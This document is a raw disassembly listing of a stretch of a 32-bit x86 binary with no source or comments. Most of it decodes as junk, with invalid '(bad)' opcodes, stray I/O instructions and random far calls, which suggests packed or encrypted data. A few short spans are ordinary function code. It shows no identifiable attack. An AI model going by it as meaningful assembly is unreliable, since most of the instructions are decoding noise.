  40f3c7:	push   es
  40f3c8:	xlat   BYTE PTR ds:[ebx]
  40f3c9:	arpl   WORD PTR [esi+0x0],cx
  40f3cc:	loopne 0x40f3df
  40f3ce:	clc    
  40f3cf:	cdq    
  40f3d0:	lods   al,BYTE PTR ds:[esi]
  40f3d1:	stos   DWORD PTR es:[edi],eax
  40f3d2:	mov    eax,ds:0xe9acbc47
  40f3d7:	or     dh,cl
  40f3d9:	mov    edi,0xdf862887
  40f3de:	or     edx,DWORD PTR [esi-0x2bda8f7a]
  40f3e4:	mov    edx,0xe07ee9cf
  40f3e9:	hlt    
  40f3ea:	sbb    esp,edx
  40f3ec:	js     0x40f3fe
  40f3ee:	fwait
  40f3ef:	(bad)  
  40f3f0:	jcxz   0x40f44c
  40f3f3:	out    0x47,al
  40f3f5:	inc    edi
  40f3f6:	add    dl,BYTE PTR [ecx]
  40f3f8:	push   esp
  40f3f9:	imul   eax,DWORD PTR [ebp-0x29dbe29c],0x437de424
  40f403:	adc    edi,DWORD PTR [ecx-0x5ff13244]
  40f409:	mov    ebx,DWORD PTR [edx]
  40f40b:	rcr    DWORD PTR [ebx],cl
  40f40d:	jno    0x40f3b1
  40f40f:	dec    ebx
  40f410:	dec    ebx
  40f411:	pushf  
  40f412:	ss jnp 0x40f46d
  40f415:	sub    al,0x77
  40f417:	jb     0x40f3ff
  40f419:	jmp    FWORD PTR [eax+0x6b7a6a7f]
  40f41f:	xor    BYTE PTR [eax],bh
  40f421:	cmp    eax,0x4e387a83
  40f426:	data16 (bad) 
  40f428:	inc    DWORD PTR [edx-0xe]
  40f42b:	push   es
  40f42c:	cwde   
  40f42d:	ficomp DWORD PTR [bx-0x73]
  40f431:	(bad)  
  40f432:	jp     0x40f45f
  40f434:	pop    ebp
  40f435:	fwait
  40f436:	cld    
  40f437:	test   DWORD PTR [esi],ebp
  40f439:	fldz   
  40f43b:	push   esi
  40f43c:	loope  0x40f3cb
  40f43e:	repz rcl DWORD PTR [edi],cl
  40f441:	repz popa 
  40f443:	inc    ecx
  40f444:	(bad)  
  40f445:	in     al,dx
  40f446:	mov    ecx,0x5286007f
  40f44b:	test   al,0xf7
  40f44d:	aad    0x74
  40f44f:	fsub   DWORD PTR [ebx-0x55edd7f8]
  40f455:	retf   
  40f456:	(bad)  
  40f457:	ds ins BYTE PTR es:[edi],dx
  40f459:	icebp  
  40f45a:	add    BYTE PTR [ecx],dh
  40f45c:	(bad)  
  40f45d:	retf   
  40f45e:	sub    ah,bh
  40f460:	sbb    DWORD PTR [esi+ebp*8+0x30],esi
  40f464:	pushf  
  40f465:	pcmpgtw mm1,QWORD PTR [eax+0x18694512]
  40f46c:	ins    BYTE PTR es:[edi],dx
  40f46d:	repnz xchg edi,eax
  40f46f:	xor    edi,DWORD PTR [ebx+0x31]
  40f472:	pusha  
  40f473:	repnz inc esi
  40f475:	rcr    DWORD PTR [edx],1
  40f477:	popa   
  40f478:	dec    esi
  40f479:	push   eax
  40f47a:	add    BYTE PTR [esi],bh
  40f47c:	into   
  40f47d:	int3   
  40f47e:	stc    
  40f47f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f480:	push   cs
  40f481:	inc    ebp
  40f482:	pop    ds
  40f483:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f484:	in     al,dx
  40f485:	sub    DWORD PTR [edx-0x71],ebx
  40f488:	sti    
  40f489:	out    dx,al
  40f48a:	jmp    0xe35b91a
  40f48f:	cmp    edx,DWORD PTR [eax]
  40f491:	sub    eax,0xd3750269
  40f496:	adc    eax,0x75f01ec5
  40f49b:	test   DWORD PTR [ebx],ebx
  40f49d:	repnz fist DWORD PTR [ebx+ebx*8-0x2743a3ce]
  40f4a5:	leave  
  40f4a6:	imul   eax,DWORD PTR [ecx+0x20451fab],0xffffffc4
  40f4ad:	mov    edx,0x48f25460
  40f4b2:	in     eax,dx
  40f4b3:	mov    esp,0x885bd9c0
  40f4b8:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40f4ba:	mov    ch,0xd1
  40f4bc:	push   ecx
  40f4bd:	mov    ebp,0x3cf1da54
  40f4c2:	sbb    ebx,esi
  40f4c4:	fwait
  40f4c5:	cs sbb eax,0xedafd1cf
  40f4cb:	js     0x40f49f
  40f4cd:	jne    0x40f518
  40f4cf:	xchg   BYTE PTR fs:[edi+0x1],al
  40f4d3:	(bad)  
  40f4d4:	fistp  DWORD PTR [esi-0x7bd4faa3]
  40f4da:	lods   al,BYTE PTR ds:[esi]
  40f4db:	nop
  40f4dc:	or     al,0x5f
  40f4de:	jecxz  0x40f463
  40f4e0:	dec    ebx
  40f4e1:	sbb    ebp,DWORD PTR [edi-0x80]
  40f4e4:	sbb    esi,eax
  40f4e6:	xchg   esi,eax
  40f4e7:	clc    
  40f4e8:	in     al,0x54
  40f4ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f4eb:	inc    ebp
  40f4ec:	push   ds
  40f4ed:	lods   eax,DWORD PTR ds:[esi]
  40f4ee:	int    0x4a
  40f4f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f4f1:	lahf   
  40f4f2:	xor    eax,0x7128f2d7
  40f4f7:	imul   DWORD PTR [esi+esi*8+0x6b]
  40f4fb:	inc    ebp
  40f4fc:	je     0x40f4e2
  40f4fe:	dec    esi
  40f500:	pop    esp
  40f501:	xchg   esp,eax
  40f503:	push   ebx
  40f504:	xor    eax,DWORD PTR [esi-0x61]
  40f507:	fidiv  DWORD PTR [ecx-0x73]
  40f50a:	inc    eax
  40f50b:	ret    0xf633
  40f50e:	mov    DWORD PTR [ebp-0x14],ecx
  40f511:	mov    eax,DWORD PTR [ebp-0x28]
  40f514:	jmp    0x40f908
  40f519:	sbb    al,0x75
  40f51b:	sar    DWORD PTR [esi+0x71b35a51],1
  40f521:	lahf   
  40f522:	popa   
  40f523:	sti    
  40f524:	arpl   WORD PTR [ebp-0x23],bp
  40f527:	out    dx,al
  40f528:	(bad)  
  40f529:	mov    dh,0xaf
  40f52b:	jo     0x40f59d
  40f52d:	dec    ecx
  40f52e:	jge    0x40f5a0
  40f530:	jo     0x40f4b8
  40f532:	mov    ds:0xea5f1807,eax
  40f537:	dec    ebp
  40f538:	xchg   ebx,eax
  40f539:	sub    dh,BYTE PTR [edi-0x39eae018]
  40f53f:	push   ss
  40f540:	or     DWORD PTR [edx+0x199fb268],edx
  40f546:	aaa    
  40f547:	fisubr DWORD PTR [esi+0x45]
  40f54a:	and    DWORD PTR [ebx-0x7e],ebp
  40f54d:	push   ds
  40f54e:	or     ebp,edi
  40f550:	test   al,0x67
  40f552:	cmp    eax,0x1954258a
  40f557:	inc    ebx
  40f559:	addr16 cmp al,dl
  40f55c:	jge    0x40f544
  40f55e:	cdq    
  40f55f:	data16 sti 
  40f561:	shl    esi,cl
  40f563:	cmp    cl,BYTE PTR [edx]
  40f565:	sbb    eax,0xc92188db
  40f56a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f56b:	mov    edi,0xe3029f1
  40f570:	pop    esp
  40f571:	or     DWORD PTR [ecx+0x47],esp
  40f574:	add    al,0x7d
  40f576:	or     esi,esi
  40f578:	jo     0x40f512
  40f57a:	push   ss
  40f57b:	xor    al,0xe4
  40f57d:	les    ecx,FWORD PTR [edx]
  40f57f:	add    eax,0xe734f303
  40f584:	fdivr  QWORD PTR [ecx-0x25]
  40f587:	xlat   BYTE PTR ds:[ebx]
  40f588:	in     al,0xa9
  40f58a:	imul   ebx,DWORD PTR [ebp+eax*2-0x39],0xffffffe4
  40f58f:	fnstsw WORD PTR [eax+0xfcc2a40]
  40f595:	mov    ah,0xf5
  40f597:	mov    dl,0x92
  40f599:	mov    DWORD PTR [edi+0x46],ebp
  40f59c:	lock mov al,ds:0xaa44a181
  40f5a2:	jp     0x40f5cc
  40f5a4:	xor    DWORD PTR [edi+0x56],edi
  40f5a7:	bnd lock jo 0x40f5d1
  40f5ab:	mov    dl,BYTE PTR [edi+0x2a]
  40f5ae:	stos   DWORD PTR es:[edi],eax
  40f5af:	ss inc edx
  40f5b1:	fstp   QWORD PTR [edi]
  40f5b3:	in     eax,0xfe
  40f5b5:	mov    ds:0x285ef57d,eax
  40f5ba:	pop    ss
  40f5bb:	or     eax,0x20b40e3c
  40f5c0:	dec    ecx
  40f5c1:	pop    ebx
  40f5c2:	mov    ds:0xd8acc110,eax
  40f5c7:	add    ah,BYTE PTR [ebp-0x37]
  40f5ca:	pusha  
  40f5cb:	stos   DWORD PTR es:[edi],eax
  40f5cc:	pop    ds
  40f5cd:	fcmovb st,st(1)
  40f5cf:	out    dx,eax
  40f5d0:	add    al,0x73
  40f5d2:	std    
  40f5d3:	push   0x7
  40f5d5:	daa    
  40f5d6:	dec    ecx
  40f5d7:	into   
  40f5d8:	jp     0x40f61f
  40f5da:	adc    ch,BYTE PTR [ebx]
  40f5dc:	add    al,0xd4
  40f5de:	sub    DWORD PTR [edx+eax*2+0x18d7f12b],0xd3183489
  40f5e9:	sub    BYTE PTR cs:[ebx+0x7c],ch
  40f5ed:	and    edx,DWORD PTR [ecx-0x7e]
  40f5f0:	xchg   edi,eax
  40f5f1:	sbb    ch,BYTE PTR [ebx+edx*4]
  40f5f4:	lock jecxz 0x40f636
  40f5f7:	sbb    eax,0xa0e5d079
  40f5fc:	mov    ebx,0xa4661e4a
  40f601:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f602:	rsqrtps xmm4,xmm7
  40f605:	aad    0x44
  40f607:	fwait
  40f608:	inc    ecx
  40f609:	stos   BYTE PTR es:[edi],al
  40f60a:	inc    BYTE PTR [edx+edx*1-0x2a]
  40f60e:	mov    edx,edi
  40f610:	xchg   edx,eax
  40f611:	pop    edx
  40f612:	cld    
  40f613:	cmp    DWORD PTR [edx-0x5b302d5f],edi
  40f619:	mov    esp,0xe0f55d0a
  40f61e:	add    ah,BYTE PTR [ebp-0x4714a3cc]
  40f624:	pop    ss
  40f625:	or     DWORD PTR [ecx+0x28],esi
  40f628:	jp     0x40f635
  40f62a:	outs   dx,BYTE PTR ds:[esi]
  40f62b:	push   ds
  40f62c:	dec    esp
  40f62d:	cmc    
  40f62e:	add    al,0xb5
  40f630:	mov    ds:0x6738208f,eax
  40f635:	loope  0x40f5f3
  40f637:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f638:	inc    esi
  40f639:	pop    ebp
  40f63a:	sub    al,0xd5
  40f63c:	(bad)  
  40f63d:	cld    
  40f63e:	push   esp
  40f63f:	jo     0x40f6b8
  40f641:	neg    DWORD PTR [edx]
  40f643:	scas   eax,DWORD PTR es:[edi]
  40f644:	adc    eax,0x10475151
  40f649:	mov    ecx,0x4515b03f
  40f64e:	sti    
  40f64f:	les    edx,FWORD PTR [ebp-0x787f6c6f]
  40f655:	push   esp
  40f656:	pop    ebp
  40f657:	ss sub eax,0xfb3f3089
  40f65d:	lock or al,0x2b
  40f660:	(bad)  
  40f661:	call   0x67547f25
  40f666:	mov    BYTE PTR [esi],dl
  40f668:	xchg   edx,eax
  40f669:	shl    DWORD PTR [ebx-0x51],1
  40f66c:	bnd jb 0x40f68c
  40f66f:	(bad)  
  40f670:	push   ds
  40f671:	sub    ch,BYTE PTR ss:[eax+edi*1-0x2a]
  40f676:	jae    0x40f69f
  40f678:	mov    ebp,0x74cd1b7f
  40f67d:	cmp    esi,DWORD PTR [ebp+0x32fefbc7]
  40f683:	xchg   edx,eax
  40f684:	sub    al,0x76
  40f686:	fcmovbe st,st(6)
  40f688:	jl     0x40f69b
  40f68a:	pop    esi
  40f68b:	inc    esp
  40f68c:	pop    ebx
  40f68d:	in     al,dx
  40f68e:	push   cs
  40f68f:	push   ds
  40f690:	into   
  40f691:	aaa    
  40f692:	mov    edi,0x43554935
  40f697:	out    dx,eax
  40f698:	xor    al,0x62
  40f69a:	ins    BYTE PTR es:[edi],dx
  40f69b:	cmp    DWORD PTR [esi+0x3b],0xffffff9a
  40f69f:	jbe    0x40f62f
  40f6a1:	mov    ebx,0x720d0ab9
  40f6a6:	jl     0x40f6f6
  40f6a8:	out    dx,al
  40f6a9:	cmp    ebp,esp
  40f6ab:	inc    ecx
  40f6ac:	popf   
  40f6ad:	push   eax
  40f6ae:	sbb    BYTE PTR ds:0x5afa0f59,ch
  40f6b4:	pop    esi
  40f6b5:	or     al,0x76
  40f6b7:	cwde   
  40f6b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f6b9:	and    DWORD PTR [eax],edx
  40f6bb:	mov    eax,ds:0xac50684b
  40f6c0:	mov    ds:0x70ea88b1,al
  40f6c5:	cmp    al,0xf1
  40f6c7:	aad    0xe5
  40f6c9:	ins    DWORD PTR es:[edi],dx
  40f6ca:	inc    DWORD PTR [esi+ebx*2]
  40f6cd:	sbb    al,0x6e
  40f6cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6d0:	mov    cs,ebx
  40f6d2:	and    edx,DWORD PTR [eax-0x72ce8bbf]
  40f6d8:	sub    al,0xcc
  40f6da:	shl    DWORD PTR [eax-0xb],1
  40f6dd:	out    dx,eax
  40f6de:	not    edi
  40f6e0:	lds    edx,FWORD PTR [edx+0x4151f030]
  40f6e6:	or     BYTE PTR [edx],ah
  40f6e8:	addr16 sub al,0xa5
  40f6eb:	jae    0x40f69e
  40f6ed:	push   ebx
  40f6ee:	add    edx,DWORD PTR [eax]
  40f6f0:	mov    eax,0x102dec8a
  40f6f5:	xor    BYTE PTR [esi-0x55ba49d8],ch
  40f6fb:	bound  esi,QWORD PTR [eax]
  40f6fd:	arpl   bp,dx
  40f6ff:	pop    es
  40f700:	cwde   
  40f701:	xchg   ecx,eax
  40f702:	and    bh,ch
  40f704:	int3   
  40f705:	inc    ebx
  40f706:	pusha  
  40f707:	(bad)  
  40f708:	pop    esi
  40f709:	sub    BYTE PTR [ebx],0x6f
  40f70c:	xor    edi,ebx
  40f70e:	cvttps2pi mm2,QWORD PTR [ecx]
  40f711:	xchg   edx,eax
  40f712:	outs   dx,DWORD PTR ds:[esi]
  40f713:	ins    DWORD PTR es:[edi],dx
  40f714:	test   al,0x50
  40f716:	xchg   ecx,eax
  40f717:	xor    edi,ebp
  40f719:	pusha  
  40f71a:	ins    BYTE PTR es:[edi],dx
  40f71b:	in     al,0x51
  40f71d:	jne    0x40f746
  40f71f:	add    BYTE PTR [esi+0x3153da07],0x1f
  40f726:	pop    eax
  40f727:	mov    ah,0xac
  40f729:	mov    esi,0xae5ce835
  40f72e:	out    0x15,eax
  40f730:	pop    eax
  40f731:	and    eax,0xdadcf2d5
  40f736:	repnz xor ebp,DWORD PTR [ebx+0x153da267]
  40f73d:	cwde   
  40f73e:	mov    dh,0x10
  40f740:	sub    ebp,ecx
  40f742:	cmp    esi,DWORD PTR [edx+0x1e]
  40f745:	cmp    DWORD PTR [eax-0xe],ebx
  40f748:	jno    0x40f72f
  40f74a:	popf   
  40f74b:	ror    DWORD PTR [ecx-0x18],1
  40f74e:	mov    dl,0x6d
  40f750:	fild   QWORD PTR [edi+0x541b83d7]
  40f756:	or     BYTE PTR [esi-0x6c],0x38
  40f75a:	loop   0x40f708
  40f75c:	xor    edi,DWORD PTR [eax+0x41a9e37e]
  40f762:	lock jge 0x40f704
  40f765:	push   0x97f1189b
  40f76a:	jl     0x40f798
  40f76c:	cmc    
  40f76d:	into   
  40f76e:	adc    al,0x47
  40f770:	adc    eax,0x52f973d6
  40f775:	mov    ebp,0x699c06e6
  40f77a:	xor    al,0x7f
  40f77c:	jae    0x40f776
  40f77e:	fstp   QWORD PTR [eax]
  40f780:	push   ebx
  40f781:	lds    ebp,FWORD PTR [edi+0x6b2620b5]
  40f787:	in     eax,0xff
  40f789:	loop   0x40f784
  40f78b:	test   eax,0x5962399d
  40f790:	push   cs
  40f791:	in     al,0x38
  40f793:	mov    cl,0x5a
  40f795:	call   0x325:0xaead7010
  40f79c:	push   eax
  40f79d:	(bad)  
  40f79e:	std    
  40f79f:	add    BYTE PTR [ebx+ebp*1-0x47],bl
  40f7a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7a4:	mov    eax,0x67777159
  40f7a9:	and    al,0x67
  40f7ab:	pop    ebx
  40f7ac:	daa    
  40f7ad:	jbe    0x40f7ae
  40f7af:	shr    DWORD PTR [edx+esi*4+0x5e2661f6],1
  40f7b6:	jge    0x40f75c
  40f7b8:	bound  ebp,QWORD PTR [esi+ecx*4-0x48]
  40f7bc:	in     eax,dx
  40f7bd:	in     al,0x95
  40f7bf:	imul   edx,DWORD PTR [ecx+0x2b453ab1],0xd915bc0c
  40f7c9:	cmp    BYTE PTR es:[esi],bh
  40f7cc:	push   edi
  40f7cd:	nop
  40f7ce:	(bad)  
  40f7cf:	mov    esi,0x35201d63
  40f7d4:	adc    eax,0x9fda2cce
  40f7d9:	and    al,0x5b
  40f7db:	mov    DWORD PTR cs:[ebx+esi*8+0x41],ebx
  40f7e0:	aaa    
  40f7e1:	lds    esi,FWORD PTR [ecx-0x7388c157]
  40f7e7:	cmp    al,0x98
  40f7e9:	lods   al,BYTE PTR ds:[esi]
  40f7ea:	call   0x6cbd:0xedd5fa68
  40f7f1:	fs inc ecx
  40f7f3:	fsubp  st(2),st
  40f7f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7f6:	fild   DWORD PTR [esi-0x7c5d93dc]
  40f7fc:	les    ebp,FWORD PTR [edi+0xde88e53]
  40f802:	sbb    ch,BYTE PTR [ebx]
  40f804:	les    ecx,FWORD PTR [eax]
  40f806:	sbb    ecx,DWORD PTR [ebx]
  40f808:	loop   0x40f81e
  40f80a:	inc    ebx
  40f80b:	fldcw  WORD PTR [eax+0x60]
  40f80e:	or     BYTE PTR [ecx],dh
  40f810:	sub    DWORD PTR [edi-0x57],0xffffff83
  40f814:	jle    0x40f7ed
  40f816:	push   ecx
  40f817:	test   BYTE PTR [ecx+0x51],dh
  40f81a:	or     ecx,DWORD PTR [ecx+eiz*4-0x7f523c25]
  40f821:	cmp    dh,dh
  40f823:	xchg   edx,eax
  40f824:	pop    ds
  40f825:	or     eax,eax
  40f827:	mov    eax,ds:0xf6bc0ef9
  40f82c:	fst    st(3)
  40f82e:	adc    DWORD PTR [esi],edi
  40f830:	jb     0x40f7ef
  40f832:	jge    0x40f84b
  40f834:	sub    al,0x65
  40f836:	ja     0x40f832
  40f838:	in     al,dx
  40f839:	test   cl,0x83
  40f83c:	dec    edx
  40f83d:	mov    ebp,0x6a33d9f4
  40f842:	sub    BYTE PTR [edx-0x38],ah
  40f845:	(bad)  
  40f846:	push   ebp
  40f847:	cmp    BYTE PTR [esi-0x6d],dh
  40f84a:	int    0x9f
  40f84c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f84d:	fwait
  40f84e:	jno    0x40f8a8
  40f850:	inc    esp
  40f851:	cmp    BYTE PTR [ebx-0x4ccda666],0x45
  40f858:	fimul  WORD PTR [eax]
  40f85a:	aaa    
  40f85b:	retf   
  40f85c:	lds    ebp,FWORD PTR [esi]
  40f85e:	sub    al,ah
  40f860:	push   ds
  40f861:	inc    ebp
  40f862:	jno    0x40f7f8
  40f864:	retf   
  40f865:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f866:	enter  0xcc82,0x3f
  40f86a:	or     eax,DWORD PTR [edx]
  40f86c:	cmp    bh,bl
  40f86e:	inc    ebx
  40f86f:	lahf   
  40f870:	add    DWORD PTR [esi],esi
  40f872:	aam    0xb6
  40f874:	push   ss
  40f875:	and    eax,0x6286d23d
  40f87a:	aaa    
  40f87b:	mov    DWORD PTR [edx+0x62f612de],ebx
  40f881:	push   0x74255d5c
  40f886:	(bad)  
  40f887:	mov    ds:0x9511070a,al
  40f88c:	ja     0x40f8fc
  40f88e:	aam    0x94
  40f890:	mov    bh,0xd1
  40f892:	add    eax,0x4d058e3f
  40f897:	sbb    al,0x51
  40f899:	fs sub al,0x97
  40f89c:	bound  ecx,QWORD PTR [ecx-0x6a94393c]
  40f8a2:	fdivr  QWORD PTR [edx+edx*4]
  40f8a5:	dec    ecx
  40f8a6:	push   0xffffffb6
  40f8a8:	(bad)  
  40f8aa:	adc    eax,0xca1689b8
  40f8af:	or     edx,ebp
  40f8b1:	fld    QWORD PTR [ebx+esi*4+0x328e6340]
  40f8b8:	in     eax,dx
  40f8b9:	mov    ebx,0x1cef1e2c
  40f8be:	inc    edx
  40f8bf:	or     edi,ecx
  40f8c1:	pusha  
  40f8c2:	aad    0x7
  40f8c4:	push   es
  40f8c5:	cmp    dl,BYTE PTR [ebx+edi*4]
  40f8c8:	jmp    0xb9069cad
  40f8cd:	outs   dx,DWORD PTR ds:[esi]
  40f8ce:	xchg   edi,eax
  40f8cf:	add    DWORD PTR [eax+0x292228b5],ebx
  40f8d5:	and    edi,DWORD PTR [ecx-0xabd441a]
  40f8db:	js     0x40f90c
  40f8dd:	add    al,0x38
  40f8df:	jo     0x40f8b1
  40f8e1:	cmp    al,0xd0
  40f8e3:	fisub  WORD PTR [edi+edx*4+0x1b]
  40f8e7:	mov    esp,ds
  40f8e9:	sti    
  40f8ea:	inc    ebp
  40f8eb:	push   0xbe82a448
  40f8f0:	inc    edx
  40f8f1:	out    0x62,al
  40f8f3:	fmul   DWORD PTR [eax]
  40f8f5:	pop    esp
  40f8f6:	ret    
  40f8f7:	scas   al,BYTE PTR es:[edi]
  40f8f8:	mov    cl,0x4f
  40f8fa:	shl    ebp,cl
  40f8fc:	cmp    al,0x1f
  40f8fe:	cmc    
  40f8ff:	fmul   QWORD PTR [ebx]
  40f901:	cdq    
  40f902:	cmc    
  40f903:	shl    BYTE PTR ds:0x8bca2d3a,cl
  40f909:	dec    ebp
  40f90a:	or     BYTE PTR [ebx],al
  40f90c:	or     al,0xb8
  40f90e:	lea    eax,[ebp-0x8]
  40f911:	mov    DWORD PTR [ebp-0x30],ecx
  40f914:	push   eax
  40f915:	push   DWORD PTR [ebp-0x30]
  40f918:	push   DWORD PTR [ebp+0xc]
  40f91b:	call   0x403925
  40f920:	mov    eax,DWORD PTR [ebp-0x4]
  40f923:	mov    ecx,DWORD PTR [ebp-0x8]
  40f926:	jmp    0x40fd1a
  40f92b:	or     DWORD PTR ds:[edi],eax
  40f92e:	(bad)  
  40f92f:	rcl    edx,cl
  40f931:	cmp    DWORD PTR [ecx],edx
  40f933:	pop    ecx
  40f934:	jns    0x40f901
  40f936:	popa   
  40f937:	popa   
  40f938:	fnstcw WORD PTR [edx-0x62]
  40f93b:	(bad)  
  40f93c:	stos   DWORD PTR es:[edi],eax
  40f93d:	jo     0x40f9af
  40f93f:	dec    ecx
  40f940:	jge    0x40f9b2
  40f942:	jo     0x40f97c
  40f944:	sub    al,0x24
  40f946:	ins    DWORD PTR es:[edi],dx
  40f947:	in     al,dx
  40f948:	out    0x3,eax
  40f94a:	lods   al,BYTE PTR ds:[esi]
  40f94b:	call   0x7046:0xdc42b7a3
  40f952:	jae    0x40f9cf
  40f954:	jmp    0x7bd4:0x32f35654
  40f95b:	aaa    
  40f95c:	and    edi,DWORD PTR [ecx+0x17494828]
  40f962:	mov    WORD PTR [esi],?
  40f964:	push   esi
  40f965:	out    dx,eax
  40f966:	jg     0x40f9c4
  40f968:	pop    es
  40f969:	add    dl,dl
  40f96b:	jnp    0x40f978
  40f96d:	lea    edi,[ebp+0x23]
  40f970:	repz mov edi,0xa161d54e
  40f976:	pop    edx
  40f977:	pusha  
  40f978:	cli    
  40f979:	ja     0x40f9e2
  40f97b:	mov    al,BYTE PTR [ecx]
  40f97d:	data16 jo 0x40f9f0
  40f980:	call   0xb30:0x54945b2f
  40f987:	pop    ebp
  40f988:	mov    ah,0x5a
  40f98a:	pop    es
  40f98b:	repnz int 0x87
  40f98e:	xor    ecx,DWORD PTR [ecx]
  40f990:	jmp    0x6059b246
  40f995:	jo     0x40f9ca
  40f997:	fwait
  40f998:	pop    edx
  40f999:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f99a:	sub    dl,BYTE PTR [eax+0x6cacb2dc]
  40f9a0:	inc    ebp
  40f9a1:	and    dl,BYTE PTR [edx-0x2ccb39ea]
  40f9a7:	mov    ebp,0xf762cf3b
  40f9ac:	outs   dx,BYTE PTR ds:[esi]
  40f9ad:	mov    dh,0x30
  40f9af:	mov    ch,0x92
  40f9b1:	imul   eax,DWORD PTR [ecx+0x4a5275dd],0x9
  40f9b8:	in     al,dx
  40f9b9:	scas   eax,DWORD PTR es:[edi]
  40f9ba:	pop    ss
  40f9bb:	popa   
  40f9bc:	test   al,0xa5
  40f9be:	iret   
  40f9bf:	aaa    
  40f9c0:	(bad)  
  40f9c1:	mov    eax,0xcf076f6
  40f9c6:	lods   eax,DWORD PTR ds:[esi]
  40f9c7:	in     al,0x23
  40f9c9:	add    ecx,DWORD PTR [ebx+0x6b35631f]
  40f9cf:	xor    DWORD PTR gs:0x9ef,ecx
  40f9d5:	cli    
  40f9d6:	mov    WORD PTR [eax-0x14],?
  40f9d9:	lods   eax,DWORD PTR ds:[esi]
  40f9da:	call   DWORD PTR [esi-0x224fc8a0]
  40f9e0:	loopne 0x40f9e7
  40f9e2:	inc    ebp
  40f9e3:	jge    0x40fa1e
  40f9e5:	ins    DWORD PTR es:[edi],dx
  40f9e6:	fnsave [ebp+0x745b6d69]
  40f9ec:	aam    0x10
  40f9ee:	pop    ds
  40f9ef:	pushf  
  40f9f0:	or     edx,DWORD PTR [edx-0x55ac6fd0]
  40f9f6:	sbb    dl,BYTE PTR [edi-0x68c4b4e7]
  40f9fc:	mov    bl,0x3e
  40f9fe:	and    eax,0x77b29cde
  40fa03:	sbb    eax,0x4f848ec2
  40fa08:	fsub   DWORD PTR [esi-0x77]
  40fa0b:	pop    ss
  40fa0c:	cmp    bl,bl
  40fa0e:	lods   al,BYTE PTR ds:[esi]
  40fa0f:	push   ebx
  40fa10:	push   ebp
  40fa11:	outs   dx,BYTE PTR ds:[esi]
  40fa12:	sub    ah,BYTE PTR [eax+ebp*1+0x15]
  40fa16:	ja     0x40fa53
  40fa18:	sbb    eax,0xcce92d58
  40fa1d:	inc    esp
  40fa1e:	scas   eax,DWORD PTR es:[edi]
  40fa1f:	(bad)  
  40fa20:	jg     0x40fa6a
  40fa22:	(bad)  
  40fa23:	push   ds
  40fa24:	fisubr DWORD PTR [ebp+ebp*8-0x2831de61]
  40fa2b:	rcl    edx,1
  40fa2d:	(bad)  
  40fa2e:	(bad)  
  40fa2f:	mov    ds:0xb13dab0c,eax
  40fa34:	or     esp,DWORD PTR [ebx+0x398a77c0]
  40fa3a:	mov    WORD PTR [ecx-0x369169da],cs
  40fa40:	xchg   edi,eax
  40fa41:	(bad)  
  40fa42:	(bad)  [eax+0x402d09f2]
  40fa48:	es or  bl,ah
  40fa4b:	fnstenv [ecx+0x3554997a]
  40fa51:	inc    esp
  40fa52:	dec    ebx
  40fa53:	add    DWORD PTR [edx+edx*1-0x542ecf6e],edx
  40fa5a:	rcl    DWORD PTR [ecx],1
  40fa5c:	adc    al,0xe9
  40fa5e:	nop
  40fa5f:	fldcw  WORD PTR [esi+ebx*1]
  40fa62:	aas    
  40fa63:	outs   dx,BYTE PTR ds:[esi]
  40fa64:	mov    DWORD PTR [edx+eax*2],esi
  40fa67:	mov    eax,0x35f18319
  40fa6c:	mov    esi,0x22bb2fe0
  40fa71:	cwde   
  40fa72:	cdq    
  40fa73:	lahf   
  40fa74:	xchg   edi,eax
  40fa75:	xchg   ecx,edi
  40fa77:	fist   WORD PTR [ebp+0x8fe6486]
  40fa7d:	fild   WORD PTR [ebx]
  40fa7f:	or     esp,DWORD PTR [ebp-0x3d]
  40fa82:	cmp    ebp,DWORD PTR [ecx]
  40fa84:	inc    esp
  40fa85:	mov    dh,0xb7
  40fa87:	and    BYTE PTR [eax-0x61],0x5b
  40fa8b:	ins    DWORD PTR es:[edi],dx
  40fa8c:	cwde   
  40fa8d:	rcl    DWORD PTR [ebx-0x18],1
  40fa90:	mov    dh,dl
  40fa92:	jne    0x40fa6a
  40fa94:	add    BYTE PTR [ebp+edx*4+0x4bf7bcb3],0x76
  40fa9c:	adc    BYTE PTR [eax],al
  40fa9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa9f:	pop    ss
  40faa0:	pop    esp
  40faa1:	xor    BYTE PTR [esp+eiz*4-0x7dddcdeb],bl
  40faa8:	test   BYTE PTR [ebp-0x19],0x14
  40faac:	push   eax
  40faad:	or     ebp,edx
  40faaf:	xchg   ebp,eax
  40fab0:	pushf  
  40fab1:	mov    esi,0xa83a3625
  40fab6:	inc    ebx
  40fab7:	and    DWORD PTR [edx+0x68],ebp
  40faba:	pushf  
  40fabb:	jno    0x40fb02
  40fabd:	shr    DWORD PTR ds:0x444d1027,cl
  40fac3:	inc    ebx
  40fac4:	xor    BYTE PTR [edi-0x608b9469],ah
  40faca:	scas   eax,DWORD PTR es:[edi]
  40facb:	fst    st(6)
  40facd:	and    al,0xcd
  40facf:	stos   BYTE PTR es:[edi],al
  40fad0:	(bad)  
  40fad1:	out    0xb1,eax
  40fad3:	std    
  40fad4:	sub    eax,0xae355d30
  40fad9:	dec    eax
  40fada:	out    0xdc,al
  40fadc:	fmul   QWORD PTR [edx+esi*8-0x27abec6a]
  40fae3:	jp     0x40fb08
  40fae5:	(bad)  
  40fae6:	and    al,0x7b
  40fae8:	xor    dh,BYTE PTR [bx+si]
  40faeb:	es mov ch,0x40
  40faee:	js     0x40fa90
  40faf0:	push   cs
  40faf1:	adc    eax,DWORD PTR [eax-0x28]
  40faf4:	gs jmp 0xe07b4ad0
  40fafa:	(bad)  
